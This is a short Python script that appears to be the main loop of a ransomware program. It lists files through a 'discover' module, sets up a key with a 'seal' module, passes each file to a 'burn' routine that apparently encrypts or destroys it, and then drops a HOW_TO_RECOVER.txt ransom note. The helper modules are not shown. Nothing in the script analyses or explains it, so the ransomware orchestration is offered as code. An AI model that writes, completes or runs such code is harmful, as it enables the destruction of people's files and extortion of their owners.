import discover
import burn
import seal

archivos=discover.encuentra_archivos()
print(archivos)
seal.non_volatile_key()

for item in archivos:
    burn.main(item)

with open("HOW_TO_RECOVER.txt",'w') as file:
    file.write("RANSOM-RANSOM")
